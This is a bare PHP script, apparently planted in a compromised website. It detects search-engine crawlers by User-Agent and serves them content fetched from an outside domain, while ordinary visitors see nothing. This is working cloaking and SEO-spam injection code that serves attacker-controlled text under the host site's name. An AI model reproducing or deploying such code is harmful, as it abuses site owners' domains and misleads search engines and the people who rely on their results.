<?php
$ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
if (preg_match('/googlebot|inspectiontool|bingbot|slurp|duckduckbot|baiduspider|yandex/i', $ua)) {
 $url = 'https://bantuanpolisi.xyz/dokumen/ganas.txt';

 if (function_exists('curl_init')) {
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
 $content = curl_exec($ch);
 curl_close($ch);
 if ($content !== false) echo $content;
 } elseif (ini_get('allow_url_fopen')) {
 $content = @file_get_contents($url);
 if ($content !== false) echo $content;
 }
}
echo "";
?>